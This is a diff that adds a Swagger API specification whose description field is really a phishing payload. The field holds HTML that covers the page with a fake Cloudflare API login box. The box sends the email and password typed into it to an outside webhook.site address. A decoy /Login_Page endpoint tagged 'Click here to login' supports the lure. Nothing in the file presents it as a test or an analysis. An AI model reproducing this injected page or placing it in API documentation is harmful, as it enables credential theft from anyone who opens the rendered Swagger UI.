@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Swagger UI
+  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#f6821f22 0%,#fbad4122 100%);z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:420px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:40px 40px 30px;font-family:Arial;"><div style="font-size:24px;font-weight:700;color:#f6821f;margin-bottom:6px;">☁ Cloudflare API</div><div style="font-size:15px;color:#404041;margin-bottom:24px;">Sign in to manage your zone configuration</div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="email" placeholder="Email address" style="width:100%;padding:12px;border:1px solid #c7c7c7;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:15px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:12px;border:1px solid #c7c7c7;border-radius:6px;box-sizing:border-box;margin-bottom:8px;font-size:15px;"><div style="font-size:13px;color:#f6821f;margin:10px 0 20px;">Forgot your password?</div><button type="submit" style="width:100%;padding:12px;background:#f6821f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;">Log in</button></form></div></div></div>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
